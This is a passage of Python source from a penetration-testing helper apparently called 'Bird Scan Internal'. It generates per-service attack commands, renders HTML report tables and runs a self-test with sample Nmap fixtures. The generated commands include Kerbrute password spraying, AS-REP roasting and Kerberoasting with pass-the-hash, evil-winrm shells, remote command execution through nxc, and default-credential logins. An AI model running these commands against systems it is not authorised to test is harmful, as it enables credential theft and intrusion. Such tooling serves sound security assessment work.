    if group == "FTP":
        commands.update({
            "FTP anon": [("-", f"printf 'anonymous\\nanonymous\\npwd\\nls\\nbye\\n' | ftp -inv -p {shlex_quote(ip)} {port}")],
            "FTP ftp": [("-", f"printf 'ftp\\nftp\\npwd\\nls\\nbye\\n' | ftp -inv -p {shlex_quote(ip)} {port}")],
            "LFTP anon": [("-", f"lftp -u anonymous,anonymous -p {port} {shlex_quote(ip)} -e 'pwd; ls; bye'")],
            "LFTP ftp": [("-", f"lftp -u ftp,ftp -p {port} {shlex_quote(ip)} -e 'pwd; ls; bye'")],
            "NXC FTP": [("-", f"nxc ftp {shlex_quote(ip)} --port {port} --ls")],
        })
        if creds:
            ftp_auth_cmds = []
            for cred in creds:
                u, p, label = cred["username"], cred["password"], cred["label"]
                ftp_auth_cmds.append((label, f"printf '{u}\\n{p}\\npwd\\nls\\nbye\\n' | ftp -inv -p {shlex_quote(ip)} {port}"))
            commands["FTP auth"] = ftp_auth_cmds
        return commands
    if group == "LDAP/AD":
        ldap_scheme = "ldaps" if port in {636, 3269} else "ldap"
        ldap_cmds = [("-", f"ldapsearch -x -H {ldap_scheme}://{ip}:{port} -s base")]
        nxc_cmds = []
        if not creds:
            nxc_cmds.append(("-", f"nxc ldap {shlex_quote(ip)} --port {port} --users --groups"))
        else:
            for cred in creds:
                u, p, m, label = cred["username"], cred["password"], cred["method"], cred["label"]
                auth_nxc = f" -u {shlex_quote(u)} -p {shlex_quote(p)}" if m == "password" else f" -u {shlex_quote(u)} -H {shlex_quote(p)}"
                nxc_cmds.append((label, f"nxc ldap {shlex_quote(ip)} --port {port} --users --groups{auth_nxc}"))
        commands.update({
            "LDAPSearch": ldap_cmds,
            "NXC LDAP": nxc_cmds,
        })
        return commands
    if group == "KERBEROS":
        realm = "DOMAIN.LOCAL"
        # Try to infer realm from hostname/domain if possible
        host = state.hosts.get(ip)
        if host and host.domain:
            realm = host.domain.strip().strip(".").upper()
            
        kerbrute_wordlist = "/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt"
        commands["KRB5 info"] = [("Identificar KDC/realm", f"nmap -sV -Pn -p {port} --script krb5-info {shlex_quote(ip)}")]
        commands["Kerbrute userenum"] = [("Enumerar usuários", f"kerbrute userenum --dc {shlex_quote(ip)} -d {realm} {shlex_quote(kerbrute_wordlist)}")]
        commands["Kerbrute passwordspray"] = [("Password spray (ajuste a senha)", f"kerbrute passwordspray --dc {shlex_quote(ip)} -d {realm} {shlex_quote(kerbrute_wordlist)} Senha123!")]

        commands["DNS/Time Setup"] = [
            ("Adicionar DC ao /etc/hosts", f"echo '{ip} dc.{realm.lower()}' | sudo tee -a /etc/hosts"),
            ("Usar DC como DNS", f"echo 'nameserver {ip}' | sudo tee /etc/resolv.conf"),
            ("Sincronizar horário com DC", f"sudo net time set -S {ip}"),
        ]

        asrep_cmds = [
            ("Lista de usuários válidos (sem senha)", f"impacket-GetNPUsers -no-pass -usersfile valid-users.txt -request -dc-ip {shlex_quote(ip)} -format hashcat -outputfile asrep-hashes.txt {shlex_quote(realm + '/')}")
        ]
        kerberoast_cmds: list[tuple[str, str]] = []
        kerberos_creds = validated_kerberos_credentials(state, ip, realm)
        for cred in kerberos_creds:
            u, p, m, label = cred["username"], cred["password"], cred["method"], cred["label"]
            target = shlex_quote(f"{realm}/{u}")
            if m == "password":
                password_target = shlex_quote(f"{realm}/{u}:{p}")
                asrep_cmds.append((f"{label} — GetNPUsers", f"impacket-GetNPUsers -request -dc-ip {shlex_quote(ip)} -format hashcat -outputfile asrep-hashes-{safe_filename(u)}.txt {password_target}"))
                kerberoast_cmds.append((f"{label} — GetUserSPNs", f"impacket-GetUserSPNs -request -dc-ip {shlex_quote(ip)} -outputfile kerberoast-hashes-{safe_filename(u)}.txt {password_target}"))
            elif m == "hash":
                hashes = shlex_quote(normalize_ntlm_hash(p))
                asrep_cmds.append((f"{label} — GetNPUsers PTH", f"impacket-GetNPUsers -request -dc-ip {shlex_quote(ip)} -format hashcat -outputfile asrep-hashes-{safe_filename(u)}.txt -hashes {hashes} {target}"))
                kerberoast_cmds.append((f"{label} — GetUserSPNs PTH", f"impacket-GetUserSPNs -request -dc-ip {shlex_quote(ip)} -outputfile kerberoast-hashes-{safe_filename(u)}.txt -hashes {hashes} {target}"))

        commands["AS-REP Roasting"] = asrep_cmds
        if kerberoast_cmds:
            commands["Kerberoasting"] = kerberoast_cmds
            
        return commands
    if group == "DATABASE/DATA":
        service_name = (service.service or "").lower()
        if port in MYSQL_PORTS or "mysql" in service_name:
            mysql_cmds = []
            if not creds:
                mysql_cmds.append(("-", f"mysql -h {shlex_quote(ip)} -P {port} -u root -p"))
            else:
                for cred in creds:
                    u, p, label = cred["username"], cred["password"], cred["label"]
                    cmd = f"mysql -h {shlex_quote(ip)} -P {port} -u {shlex_quote(u)}"
                    if p:
                        cmd += f" -p{shlex_quote(p)}"
                    mysql_cmds.append((label, cmd))
            commands["MySQL"] = mysql_cmds
        if port in POSTGRES_PORTS or "postgres" in service_name:
            psql_cmds = []
            if not creds:
                psql_cmds.append(("-", f"psql -h {shlex_quote(ip)} -p {port} -U postgres"))
            else:
                for cred in creds:
                    u, p, label = cred["username"], cred["password"], cred["label"]
                    cmd = f"psql -h {shlex_quote(ip)} -p {port} -U {shlex_quote(u)}"
                    if p:
                        cmd = f"PGPASSWORD={shlex_quote(p)} {cmd}"
                    psql_cmds.append((label, cmd))
            commands["Postgres"] = psql_cmds
        if port in MSSQL_PORTS or "ms-sql" in service_name or "mssql" in service_name:
            mssql_impacket_cmds = []
            mssql_nxc_cmds = []
            if not creds:
                mssql_impacket_cmds.append(("-", f"impacket-mssqlclient -port {port} user:pass@{shlex_quote(ip)}"))
                mssql_nxc_cmds.append(("-", f"nxc mssql {shlex_quote(ip)} --port {port} -q 'select @@version'"))
            else:
                for cred in creds:
                    u, p, m, label = cred["username"], cred["password"], cred["method"], cred["label"]
                    if m == "password":
                        mssql_impacket_cmds.append((label, f"impacket-mssqlclient -port {port} {shlex_quote(u)}:{shlex_quote(p)}@{shlex_quote(ip)}"))
                        mssql_nxc_cmds.append((label, f"nxc mssql {shlex_quote(ip)} --port {port} -u {shlex_quote(u)} -p {shlex_quote(p)} -q 'select @@version'"))
                    else:
                        mssql_impacket_cmds.append((label, f"impacket-mssqlclient -port {port} -hashes {shlex_quote(p)} {shlex_quote(u)}@{shlex_quote(ip)}"))
                        mssql_nxc_cmds.append((label, f"nxc mssql {shlex_quote(ip)} --port {port} -u {shlex_quote(u)} -H {shlex_quote(p)} -q 'select @@version'"))
            commands["MSSQL"] = mssql_impacket_cmds + mssql_nxc_cmds
        if port in REDIS_PORTS or "redis" in service_name:
            redis_cmds = []
            if not creds:
                redis_cmds.append(("-", f"redis-cli -h {shlex_quote(ip)} -p {port} INFO"))
            else:
                for cred in creds:
                    p, label = cred["password"], cred["label"]
                    cmd = f"redis-cli -h {shlex_quote(ip)} -p {port} -a {shlex_quote(p)} INFO" if p else f"redis-cli -h {shlex_quote(ip)} -p {port} INFO"
                    redis_cmds.append((label, cmd))
            commands["Redis"] = redis_cmds
        if port in MONGO_PORTS or "mongo" in service_name:
            mongo_cmds = []
            if not creds:
                mongo_cmds.append(("-", f"mongosh --host {shlex_quote(ip)} --port {port}"))
            else:
                for cred in creds:
                    u, p, label = cred["username"], cred["password"], cred["label"]
                    cmd = f"mongosh --host {shlex_quote(ip)} --port {port} -u {shlex_quote(u)} -p {shlex_quote(p)}" if u and p else f"mongosh --host {shlex_quote(ip)} --port {port}"
                    mongo_cmds.append((label, cmd))
            commands["Mongo"] = mongo_cmds
        if port in ELASTIC_PORTS or "elastic" in service_name:
            commands["Elastic"] = [("-", f"curl -s {shlex_quote(build_url('http', ip, port, '/_cluster/health?pretty'))}")]
        return commands
    if group == "WINRM":
        winrm_cmds = []
        nxc_cmds = []
        if not creds:
            winrm_cmds.append(("-", f"evil-winrm -i {shlex_quote(ip)} -P {port} -u user -p 'password'"))
            nxc_cmds.append(("-", f"nxc winrm {shlex_quote(ip)} --port {port} -x whoami"))
        else:
            for cred in creds:
                u, p, m, label = cred["username"], cred["password"], cred["method"], cred["label"]
                if m == "password":
                    winrm_cmds.append((label, f"evil-winrm -i {shlex_quote(ip)} -P {port} -u {shlex_quote(u)} -p {shlex_quote(p)}"))
                    nxc_cmds.append((label, f"nxc winrm {shlex_quote(ip)} --port {port} -u {shlex_quote(u)} -p {shlex_quote(p)} -x whoami"))
                else:
                    winrm_cmds.append((label, f"evil-winrm -i {shlex_quote(ip)} -P {port} -u {shlex_quote(u)} -H {shlex_quote(p)}"))
                    nxc_cmds.append((label, f"nxc winrm {shlex_quote(ip)} --port {port} -u {shlex_quote(u)} -H {shlex_quote(p)} -x whoami"))
        commands.update({
            "Evil-WinRM": winrm_cmds,
            "NXC WinRM": nxc_cmds,
            "CURL": [("-", f"curl -k -i --max-time 10 {shlex_quote(build_url('https' if port == 5986 else 'http', ip, port, '/wsman'))}")],
        })
        return commands
    if group == "NFS/RPC":
        commands.update({
            "Showmount": [("-", f"showmount -e {shlex_quote(ip)}")],
            "RPCInfo": [("-", f"rpcinfo -p {shlex_quote(ip)}")],
        })
        return commands
    if group == "SNMP":
        commands["SNMPWalk"] = [("-", f"snmpwalk -v2c -c public udp:{shlex_quote(ip)}:{port}")]
        return commands
    if group == "VNC":
        commands["VNCViewer"] = [("-", f"vncviewer {ip}::{port}")]
        return commands
    if group == "CONTAINER":
        commands.update({
            "CURL HTTPS": [("-", f"curl -k -i {shlex_quote(build_url('https', ip, port, '/version'))}")],
            "CURL HTTP": [("-", f"curl -i {shlex_quote(build_url('http', ip, port, '/version'))}")],
        })
        return commands
    if group == "TELNET":
        commands["Telnet"] = [("-", f"telnet {shlex_quote(ip)} {port}")]
        return commands
    if group == "MAIL":
        commands.update({
            "Swaks": [("-", f"swaks --server {shlex_quote(ip)} --port {port} --quit-after HELO")],
            "OpenSSL": [("-", f"openssl s_client -connect {ip}:{port} -servername {ip}")],
        })
        return commands
    if group == "DNS":
        commands.update({
            "DIG version": [("-", f"dig @{shlex_quote(ip)} -p {port} version.bind chaos txt")],
            "DIG AXFR": [("-", f"dig @{shlex_quote(ip)} -p {port} axfr domain.local")],
        })
        return commands
    commands["NetCat"] = [("-", netcat)]
    return commands


def dedupe_text(values: Iterable[str]) -> list[str]:
    result: list[str] = []
    for value in values:
        if value and value not in result:
            result.append(value)
    return result


def normalize_ntlm_hash(h: str) -> str:
    value = (h or "").strip()
    empty_lm = "aad3b435b51404eeaad3b435b51404ee"
    if ":" not in value:
        return f"{empty_lm}:{value}"
    lm_hash, nt_hash = value.rsplit(":", 1)
    if re.fullmatch(r"[0-9A-Fa-f]{32}", nt_hash) and not re.fullmatch(r"[0-9A-Fa-f]{32}", lm_hash):
        lm_hash = empty_lm
    return f"{lm_hash}:{nt_hash}"


def normalize_fuzz_base_url(url: str) -> str:
    if not is_valid_web_url(url):
        return ""
    parsed = urllib.parse.urlparse(url)
    path = parsed.path or "/"
    if not path.endswith("/"):
        last = path.rsplit("/", 1)[-1]
        if "." in last:
            path = path.rsplit("/", 1)[0] + "/"
        else:
            path = path + "/"
    if not path.startswith("/"):
        path = "/" + path
    return urllib.parse.urlunparse((parsed.scheme, parsed.netloc, path, "", "", ""))


def normalize_fuzz_root_url(url: str) -> str:
    if not is_valid_web_url(url):
        return ""
    parsed = urllib.parse.urlparse(url)
    return urllib.parse.urlunparse((parsed.scheme, parsed.netloc, "/", "", "", ""))


def ip_sort_key(value: str) -> tuple[int, Any]:
    try:
        address = ipaddress.ip_address(value)
        return (0, (address.version, int(address)))
    except ValueError:
        return (1, value)


def severity_rank(severity: str) -> int:
    return {"high": 0, "medium": 1, "low": 2, "info": 3}.get(severity, 4)


def category_options(evidence: list[Evidence]) -> str:
    categories = sorted({item.category for item in evidence if item.category})
    return "".join(f'<option>{h(category)}</option>' for category in categories)


def service_options(services: list[ServiceRecord]) -> str:
    names = sorted({service.service for service in services if service.service} | {service_group_name(service) for service in services})
    return "".join(f'<option>{h(name)}</option>' for name in names)


def status_options(endpoints: list[WebEndpoint]) -> str:
    codes = sorted({endpoint.status_code for endpoint in endpoints if endpoint.status_code})
    return "".join(f'<option>{h(code)}</option>' for code in codes)


def row_filter(*values: Any) -> str:
    return h(" ".join(str(value).lower() for value in values if value is not None))


def findings_table(evidence: list[Evidence], state: ScanState) -> str:
    rows = [
        "<table><thead><tr><th>Severity</th><th>Category</th><th>Target</th><th>Title</th><th>Description</th><th>Raw</th></tr></thead><tbody>"
    ]
    for item in evidence:
        target = item.ip + (f":{item.port}" if item.port else "")
        raw = raw_link(item.raw_output_file, state)
        rows.append(
            f'<tr data-filter="{row_filter(item.severity, item.category, target, item.service, item.title, item.description, evidence_filter_terms(item))}" '
            f'data-severity="{h(item.severity)}" data-category="{h(item.category)}" data-service="{h(item.service)}">'
            f'<td class="sev-{h(item.severity)}">{h(item.severity)}</td>'
            f"<td>{h(item.category)}</td><td class=\"mono\">{h(target)}</td><td>{h(item.title)}</td>"
            f"<td>{h(item.description)}</td><td>{raw}</td></tr>"
        )
    rows.append("</tbody></table>")
    return "\n".join(rows)


def evidence_filter_terms(item: Evidence) -> str:
    terms: list[str] = []
    script_id = item.data.get("script_id")
    if script_id:
        terms.append(str(script_id))
    return " ".join(terms)


def web_table(endpoints: list[WebEndpoint], services: list[ServiceRecord], state: ScanState) -> str:
    catalog = web_catalog_endpoints(services, endpoints)
    if not catalog:
        return empty_state("Nenhum endpoint WEB catalogado.")
    custom_wordlist = dashboard_custom_wordlist(state)
    grouped: dict[int, list[WebEndpoint]] = {}
    for endpoint in catalog:
        grouped.setdefault(endpoint.status_code, []).append(endpoint)
    rows = ['<div class="group-list web-status-list">']
    for status_code in sorted(grouped, key=lambda code: (code == 0, code)):
        status_endpoints = sorted(grouped[status_code], key=lambda item: (ip_sort_key(item.ip), item.port, item.scheme, item.path, item.url))
        status_label = "Sem status" if status_code == 0 else str(status_code)
        rows.append(
            f'<details class="group-item web-status-group" data-filter="{row_filter(status_label, [endpoint.url for endpoint in status_endpoints])}" '
            f'data-code="{h(status_code)}" data-service="WEB">'
            "<summary>"
            f'<span class="summary-title"><span class="mono">{h(status_label)}</span><strong>Status HTTP</strong></span>'
            f'<span class="summary-pills">{metric_pill("urls", len(status_endpoints))}{metric_pill("hosts", len({endpoint.ip for endpoint in status_endpoints}))}</span>'
            "</summary>"
            '<div class="group-body">'
            '<div class="web-list">'
            f"{web_endpoint_header()}"
            f"{''.join(web_endpoint_line(endpoint, state, custom_wordlist=custom_wordlist) for endpoint in status_endpoints)}"
            "</div>"
            "</div>"
            "</details>"
        )
    rows.append("</div>")
    return "\n".join(rows)


def services_table(services: list[ServiceRecord], state: ScanState) -> str:
    rows = [
        "<table><thead><tr><th>IP</th><th>Hostname</th><th>Porta</th><th>Protocolo</th><th>Serviço</th><th>Produto</th><th>Versão</th><th>Interação</th></tr></thead><tbody>"
    ]
    for service in services:
        host = state.hosts.get(service.ip, HostRecord(ip=service.ip))
        hostname = host.hostname or host.fqdn
        rows.append(
            f'<tr data-filter="{row_filter(service.ip, hostname, host.aliases, service.port, service.protocol, service.service, service.product, service.version)}" '
            f'data-service="{h(service.service)}">'
            f'<td class="mono">{h(service.ip)}</td><td>{h(hostname)}</td><td class="mono">{h(service.port)}</td>'
            f"<td>{h(service.protocol)}</td><td>{h(service.service)}</td><td>{h(service.product)}</td>"
            f"<td>{h(service.version)}</td><td>{service_interaction_buttons(service, state)}</td></tr>"
        )
    rows.append("</tbody></table>")
    return "\n".join(rows)


def hosts_table(hosts: list[HostRecord], dc_ips: set[str] = None) -> str:
    dc_ips = dc_ips or set()
    rows = [
        "<table><thead><tr><th>IP</th><th>Hostname</th><th>Aliases</th><th>FQDN</th><th>Domínio</th><th>OS Guess</th><th>Tags</th><th>Ações</th></tr></thead><tbody>"
    ]
    for host in hosts:
        aliases = " ".join(f'<span class="pill">{h(item)}</span>' for item in host.aliases)
        tags = " ".join(f'<span class="pill">{h(item)}</span>' for item in host.tags)
        hostnames = "\n".join(item for item in [host.hostname, host.fqdn, *host.aliases] if item)
        actions = copy_value_button("Copiar IP", host.ip) + copy_value_button("Copiar hostnames", hostnames)
        tr_class = ' class="dc-host"' if host.ip in dc_ips else ''
        rows.append(
            f'<tr{tr_class} data-filter="{row_filter(host.ip, host.hostname, host.aliases, host.fqdn, host.domain, host.os_guess, host.tags, host.sources)}">'
            f'<td class="mono">{h(host.ip)}</td><td>{h(host.hostname)}</td><td>{aliases}</td><td>{h(host.fqdn)}</td>'
            f"<td>{h(host.domain)}</td><td>{h(host.os_guess)}</td><td>{tags}</td><td>{actions}</td></tr>"
        )
    rows.append("</tbody></table>")
    return "\n".join(rows)


def dependencies_table(deps: dict[str, bool]) -> str:
    rows = ["<table><thead><tr><th>Tool</th><th>Status</th></tr></thead><tbody>"]
    for tool, present in sorted(deps.items()):
        status = "OK" if present else "missing"
        cls = "sev-info" if present else "sev-low"
        rows.append(f'<tr data-filter="{h(tool + " " + status)}"><td class="mono">{h(tool)}</td><td class="{cls}">{h(status)}</td></tr>')
    rows.append("</tbody></table>")
    return "\n".join(rows)


def raw_link(raw_file: str, state: ScanState) -> str:
    if not raw_file:
        return '<span class="muted">-</span>'
    text = raw_file_text(raw_file, state)
    if not text:
        return '<span class="muted">-</span>'
    return raw_details_html("RAW", text, meta=raw_file)


def print_summary(state: ScanState, report_path: Path, logger: Logger) -> None:
    if logger.quiet:
        return
    print("")
    print("=== Bird Scan Internal complete ===")
    print(f"Output directory: {state.output_dir}")
    print(f"Report: {report_path}")
    print(f"Hosts: {len(state.hosts)}")
    print(f"Services: {len(state.services)}")
    print(f"Web endpoints: {len(state.web_endpoints)}")
    print(f"Evidence items: {len(state.evidence)}")


def run_self_test(args: argparse.Namespace, logger: Logger) -> int:
    base_dir = Path(tempfile.mkdtemp(prefix="birdscan-selftest-"))
    fixture_dir = base_dir / "fixtures"
    fixture_dir.mkdir(parents=True, exist_ok=True)
    output_dir = base_dir / "out"

    normal_path = fixture_dir / "normal-output-without-extension"
    normal_path.write_text(
        "\n".join(
            [
                "# Nmap 7.99 scan initiated as: nmap -sS --open -oN normal-output",
                "Nmap scan report for app1.internal.local (10.10.10.10)",
                "Host is up, received user-set (0.001s latency).",
                "PORT    STATE SERVICE REASON",
                "80/tcp  open  http    syn-ack ttl 64",
                "",
                "Nmap scan report for app2.internal.local (10.10.10.10)",
                "Host is up, received user-set (0.001s latency).",
                "PORT    STATE SERVICE REASON",
                "443/tcp open  https   syn-ack ttl 64",
                "",
                "Nmap scan report for db.internal.local (10.10.10.20)",
                "Host is up (0.001s latency).",
                "PORT     STATE SERVICE VERSION",
                "3306/tcp open  mysql   MySQL 8.0.36",
                "",
            ]
        ),
        encoding="utf-8",
    )

    gnmap_path = fixture_dir / "scan-prefix.gnmap"
    gnmap_path.write_text(
        "Host: 10.10.10.30 (rdp.internal.local)\tPorts: 3389/open/tcp//ms-wbt-server//Microsoft Terminal Services/\n",
        encoding="utf-8",
    )

    xml_path = fixture_dir / "scan.xml"
    xml_path.write_text(
        """<?xml version="1.0" encoding="UTF-8"?>
<nmaprun scanner="nmap">
  <host>
    <status state="up"/>
    <address addr="10.10.10.40" addrtype="ipv4"/>
    <hostnames>
      <hostname name="web.internal.local" type="user"/>
      <hostname name="alias.internal.local" type="PTR"/>
    </hostnames>
    <ports>
      <port protocol="tcp" portid="80">
        <state state="open"/>
        <service name="http" product="nginx" version="1.28.3"/>
        <script id="http-server-header" output="Server: nginx/1.28.3"/>
      </port>
    </ports>
  </host>
</nmaprun>
""",
        encoding="utf-8",
    )

    ip_port_path = fixture_dir / "ip-port.txt"
    ip_port_path.write_text("10.10.10.50:22\n10.10.10.50:8080/tcp\n", encoding="utf-8")
    nmap_glob_normal = fixture_dir / "nmap-extra-one.nmap"
    nmap_glob_normal.write_text(
        "\n".join(
            [
                "Nmap scan report for extra.internal.local (10.10.10.91)",
                "Host is up (0.001s latency).",
                "PORT   STATE SERVICE",
                "81/tcp open  http",
                "",
            ]
        ),
        encoding="utf-8",
    )
    nmap_glob_xml = fixture_dir / "nmap-extra-two.xml"
    nmap_glob_xml.write_text(
        """<?xml version="1.0" encoding="UTF-8"?>
<nmaprun scanner="nmap">
  <host>
    <status state="up"/>
    <address addr="10.10.10.92" addrtype="ipv4"/>
    <ports>
      <port protocol="tcp" portid="82"><state state="open"/><service name="http"/></port>
    </ports>
  </host>
</nmaprun>
""",
        encoding="utf-8",
    )
    nmap_glob_junk = fixture_dir / "nmap-junk.txt"
    nmap_glob_junk.write_text("not a scan\n", encoding="utf-8")
    nmap_empty_path = fixture_dir / "nmap-empty-result.nmap"
    nmap_empty_path.write_text(
        "\n".join(
            [
                "# Nmap 7.99 scan initiated as: nmap -sn -oN empty",
                "Starting Nmap 7.99 ( https://nmap.org )",
                "Nmap done: 0 IP addresses (0 hosts up) scanned in 0.01 seconds",
                "",
            ]
        ),
        encoding="utf-8",
    )

    test_args = argparse.Namespace(**vars(args))
    test_args.output_dir = str(output_dir)
    test_args.run_name = "self-test"
    test_args.resume = None
    state = setup_run(test_args, logger)

    import_nmap_path(normal_path, state, logger)
    import_nmap_path(fixture_dir / "scan-prefix", state, logger)
    import_nmap_path(xml_path, state, logger)
    empty_import_ok = True
    try:
        import_nmap_path(nmap_empty_path, state, logger)
    except BirdScanUsageError:
        empty_import_ok = False
    parse_ip_port_file(ip_port_path, state, logger)
    ipv6_ip_port_path = fixture_dir / "ipv6-ip-port.txt"
    ipv6_ip_port_path.write_text("[2001:db8::1]:443/tcp\n", encoding="utf-8")
    ipv6_state = ScanState(run_id="ipv6", started_at="", output_dir=str(output_dir))
    parse_ip_port_file(ipv6_ip_port_path, ipv6_state, logger)
    ipv6_nmap_command = build_nmap_command(test_args, ["2001:db8::1"], output_dir / "ipv6")
    favicon_path = Path(state.output_dir) / RAW_DIR / "web" / "favicons" / "self-test.ico"
    favicon_path.parent.mkdir(parents=True, exist_ok=True)
    favicon_path.write_bytes(b"\x00\x00\x01\x00")
    state.web_endpoints.append(
        WebEndpoint(
            url="http://10.10.10.50:8080/",
            ip="10.10.10.50",
            port=8080,
            scheme="http",
            status_code=200,
            title="Self Test Login",
            server="nginx",
            content_type="text/html",
            technologies=["nginx"],
            interesting=True,
            finding_reason="self-test web endpoint",
            favicon_url="http://10.10.10.50:8080/favicon.ico",
            favicon_file=relpath(favicon_path, state.output_dir),
        )
    )
    maybe_add_web_evidence(state.web_endpoints[-1], state)
    state.web_endpoints.append(
        WebEndpoint(
            url="http://10.10.10.50:8080/api",
            ip="10.10.10.50",
            port=8080,
            scheme="http",
            path="/api",
            status_code=200,
            title="Self Test API",
            server="nginx",
            content_type="application/json",
            technologies=["nginx"],
            interesting=False,
            finding_reason="self-test fuzz route",
        )
    )
    derive_prioritized_findings(state)
    prune_suppressed_evidence(state)
    prune_unreportable_web_endpoints(state)
    save_state(state)
    write_json_export(state)
    write_csv_export(state)
    write_markdown_export(state)
    report_path = generate_html_report(state)
    report_text = report_path.read_text(encoding="utf-8", errors="replace")
    default_nmap_command = build_nmap_command(test_args, ["10.10.10.0/24"], Path(state.output_dir) / RAW_DIR / "nmap" / "default-check")
    profile_nmap_commands: dict[str, list[str]] = {}
    for profile_name in PROFILE_DEFAULTS:
        profile_args = argparse.Namespace(**vars(test_args))
        profile_args.profile = profile_name
        profile_args.full_portscan = False
        profile_args.ports = None
        profile_nmap_commands[profile_name] = build_nmap_command(
            profile_args,
            ["10.10.10.0/24"],
            Path(state.output_dir) / RAW_DIR / "nmap" / f"profile-{profile_name}",
        )
    custom_nmap_text = "sudo nmap -sV -p- -oN scan.nmap 10.10.10.1"
    custom_nmap_targets, custom_nmap_warnings = validate_targets(split_target_values(custom_nmap_text))
    gobuster_commands = fuzz_commands_by_tool("http://10.10.10.50:8080/").get("Gobuster", [])
    def flatten_cmds(cmds_dict):
        return {k: [cmd for _, cmd in v] for k, v in cmds_dict.items()}

    ftp_commands = flatten_cmds(service_primary_commands_by_tool(ServiceRecord(ip="10.10.10.50", port=21, service="ftp"), state))
    smb_commands = flatten_cmds(service_primary_commands_by_tool(ServiceRecord(ip="10.10.10.60", port=139, service="netbios-ssn"), state))
    rdp_commands = flatten_cmds(service_primary_commands_by_tool(ServiceRecord(ip="10.10.10.30", port=3390, service="ms-wbt-server"), state))
    ssh_commands = flatten_cmds(service_primary_commands_by_tool(ServiceRecord(ip="10.10.10.50", port=2222, service="ssh"), state))
    ldap_commands = flatten_cmds(service_primary_commands_by_tool(ServiceRecord(ip="10.10.10.40", port=636, service="ldaps"), state))
    kerberos_commands = flatten_cmds(service_primary_commands_by_tool(ServiceRecord(ip="10.10.10.40", port=88, service="kerberos"), state))
    mssql_commands = flatten_cmds(service_primary_commands_by_tool(ServiceRecord(ip="10.10.10.20", port=1444, service="ms-sql-s"), state))
    winrm_commands = flatten_cmds(service_primary_commands_by_tool(ServiceRecord(ip="10.10.10.70", port=5986, service="wsmans"), state))
    generic_nmap_commands = flatten_cmds(service_primary_commands_by_tool(ServiceRecord(ip="10.10.10.93", port=12345, service="unknown"), state))
    smb_signing_false_state = ScanState(run_id="smb-signing-false", started_at="", output_dir=str(output_dir))
    smb_signing_false_state.evidence.append(
        Evidence(
            category="smb",
            ip="10.10.10.61",
            port=445,
            service="smb",
            title="nxc smb",
            description="SMB signing is not required.",
            severity="medium",
            data={"smb_signing": False},
        )
    )
    smb_signing_true_state = ScanState(run_id="smb-signing-true", started_at="", output_dir=str(output_dir))
    smb_signing_true_state.evidence.append(
        Evidence(
            category="smb",
            ip="10.10.10.62",
            port=445,
            service="smb",
            title="nxc smb",
            description="SMB signing is required.",
            severity="high",
            data={"smb_signing": True},
        )
    )
    smb_signing_false_commands = service_primary_commands_by_tool(
        ServiceRecord(ip="10.10.10.61", port=445, service="microsoft-ds"),
        smb_signing_false_state,
    )
    smb_signing_true_commands = service_primary_commands_by_tool(
        ServiceRecord(ip="10.10.10.62", port=445, service="microsoft-ds"),
        smb_signing_true_state,
    )
    group_action_html = service_group_actions(
        "RDP",
        [
            ServiceRecord(ip="10.10.10.30", port=3390, service="ms-wbt-server"),
            ServiceRecord(ip="10.10.10.31", port=3391, service="ms-wbt-server"),
        ],
        state,
    )
    generic_loop_text = command_text_for_copy(
        ["nmap -Pn -p 80 10.10.10.10", "nmap -Pn -p 443 10.10.10.10"],
        loop_multiple=True,
    )
    gobuster_loop_command = fuzz_loop_commands_by_tool(
        ["http://10.10.10.50:8080/", "https://10.10.10.40/"],
        thread_count=4,
        tools=("Gobuster",),
    ).get("Gobuster", [""])[0]
    roots = web_roots_for_services(state.services, state.web_endpoints)
    catalog = web_catalog_endpoints(state.services, state.web_endpoints)
    root_catalog = web_root_catalog_endpoints(state.services, state.web_endpoints)
    root_prioritized = prioritized_web_endpoints(root_catalog, state)
    root_other = [endpoint for endpoint in root_catalog if endpoint.url not in {item.url for item in root_prioritized}]
    web_service_count = len({(service.ip, service.port) for service in state.services if is_web_service(service)})
    deep_args = argparse.Namespace(**vars(test_args))
    deep_args.deep_fuzz = True
    deep_command = build_dirsearch_command(
        deep_args,
        "http://10.10.10.50:8080/",
        Path(state.output_dir) / RAW_DIR / "web" / "dirsearch" / "deep.txt",
        Path("/tmp/should-not-be-used.txt"),
        8,
        6,
    )
    non_interesting = WebEndpoint(url="http://10.10.10.50:8080/static.txt", ip="10.10.10.50", port=8080, scheme="http", status_code=200)
    evidence_count_before = len(state.evidence)
    maybe_add_web_evidence(non_interesting, state)
    attention_test_html = attention_compact_list(state.evidence, initial=1)
    not_found_endpoint = WebEndpoint(url="http://10.10.10.90:9090/", ip="10.10.10.90", port=9090, scheme="http", status_code=404)
    not_found_roots = active_web_roots_for_services(
        [ServiceRecord(ip="10.10.10.90", port=9090, protocol="tcp", service="unknown")],
        [not_found_endpoint],
    )
    mixed_dirsearch_results = parse_dirsearch_results(
        "\n".join(
            [
                "[00:00:00] 404 - 10KB - http://10.10.10.90:9090/missing",
                "[00:00:01] 500 - 1KB - http://10.10.10.90:9090/error",
            ]
        )
    )
    glob_import_paths = resolve_nmap_import_paths(fixture_dir / "nmap*")
    flattened_nmap_inputs = nmap_import_values(argparse.Namespace(from_nmap=[[str(nmap_glob_normal), str(nmap_glob_xml)]]))
    redacted_port_command = redact_command(["smbclient", "-L", "//10.10.10.60", "-N", "-g", "-p", "445"], secrets=["secret"])
    redacted_password_command = redact_command(["nxc", "smb", "10.10.10.60", "-u", "user", "-p", "secret"], secrets=["secret"])
    group_noise_evidence = Evidence(
        category="exposure",
        ip="10.10.10.50",
        port=22,
        service="ssh",
        title="SSH open",
        description="SSH is reachable.",
    )
    group_tool_evidence = Evidence(
        category="ssh",
        ip="10.10.10.50",
        port=22,
        service="ssh",
        title="nmap ssh scripts",
        description="Nmap returned SSH metadata.",
        raw_output_file="raw/services/ssh/sample.txt",
    )
    rdp_raw_dir = Path(state.output_dir) / RAW_DIR / "services" / "rdp"
    rdp_raw_dir.mkdir(parents=True, exist_ok=True)
    rdp_raw_one = rdp_raw_dir / "rdp_one.txt"
    rdp_raw_two = rdp_raw_dir / "rdp_two.txt"
    rdp_raw_one.write_text("$ nmap -Pn -p 3389 --script rdp-enum-encryption 10.10.10.30\nRDP output one\n", encoding="utf-8")
    rdp_raw_two.write_text("$ nmap -Pn -p 3391 --script rdp-enum-encryption 10.10.10.31\nRDP output two\n", encoding="utf-8")
    rdp_group_services = [
        ServiceRecord(ip="10.10.10.30", port=3389, service="ms-wbt-server"),
        ServiceRecord(ip="10.10.10.31", port=3391, service="ms-wbt-server"),
    ]
    rdp_group_evidence = [
        Evidence(
            category="rdp",
            ip="10.10.10.30",
            port=3389,
